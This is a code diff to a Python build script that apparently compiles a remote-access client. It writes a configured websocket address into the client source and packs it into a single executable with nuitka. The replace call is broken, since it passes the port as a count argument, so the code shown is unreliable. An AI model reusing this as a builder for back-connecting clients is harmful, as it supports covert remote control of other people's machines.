@@ -16,7 +16,17 @@ logo = """
 config = ""
 
 def d_compile():
-  os.system("nuitka client/main.py --onefile")
+  content = ""
+  with open('client/main.py', 'r') as f:
+    lines = f.readlines()
+    for line in lines:
+      if "%WEBSOCKET HERE%" in line:
+        content+=line.replace("%WEBSOCKET HERE%", config['websocket']['ip'], config['websocket']['port'])
+      else:
+        content+=line
+  with open('build.py', 'w') as f:
+    f.write(content)
+  os.system("nuitka build.py --onefile")
 
 def d_admin(ip, port):
   print("hello xd")
